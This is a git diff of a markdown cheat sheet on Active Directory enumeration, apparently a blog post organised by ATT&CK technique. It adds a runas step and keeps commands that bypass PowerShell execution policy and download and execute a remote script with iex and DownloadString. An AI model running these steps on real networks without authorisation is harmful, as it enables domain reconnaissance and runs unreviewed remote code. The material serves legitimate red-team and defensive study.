@@ -9,6 +9,7 @@ permalink: /:categories/:title/
 ---
 
 <!-- vscode-markdown-toc -->
+* [PRE-REQUISITE: Run powershell with specific AD account](#PRE-REQUISITE:RunpowershellwithspecificADaccount)
 * [PRE-REQUISITE: Installing PowerView](#PRE-REQUISITE:InstallingPowerView)
 * [PRE-REQUISITE: AD Web Services on the DC](#PRE-REQUISITE:ADWebServicesontheDC)
 * [T1087.002 Account Discovery - Domain Account](#T1087.002AccountDiscovery-DomainAccount)
@@ -28,6 +29,12 @@ permalink: /:categories/:title/
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
+## <a name='PRE-REQUISITE:RunpowershellwithspecificADaccount'></a>PRE-REQUISITE: Run powershell with specific AD account
+
+```
+runas /netonly /user:adm_x@dom.corp poweshell
+```
+
 ## <a name='PRE-REQUISITE:InstallingPowerView'></a>PRE-REQUISITE: Installing PowerView
 
 - [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
@@ -40,11 +47,10 @@ permalink: /:categories/:title/
 # Bypass powershell execution protection
 powershell -ep bypass
 
-
-# ActiveDirectory Module v1
+# Download and install the ActiveDirectory Module v1
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 
-# ActiveDirectory Module v2
+# Donwload and install the ActiveDirectory Module v2
 $webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
 $resp=$webreq.GetResponse()
 $respstream=$resp.GetResponseStream()
@@ -61,11 +67,6 @@ On the error below when loading the AD module, ADWS must be reachable and runnin
 - TCP port 9389 reachable from your endpoint (and listening on the DC) : ```Test-NetConnection DC01 -port 9389```
 - Restart the service on the DC : ```Restart-Service –name ADWS –verbose```
 
-```
-PS > iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
-
-AVERTISSEMENT : Error initializing default drive: 'Unable to find a default server with Active Directory Web Services running.'.
-```
 For more info, read the article from [theitbros.om](https://theitbros.com/unable-to-find-a-default-server-with-active-directory-web-services-running/).
 
 ## <a name='T1087.002AccountDiscovery-DomainAccount'></a>T1087.002 Account Discovery - Domain Account
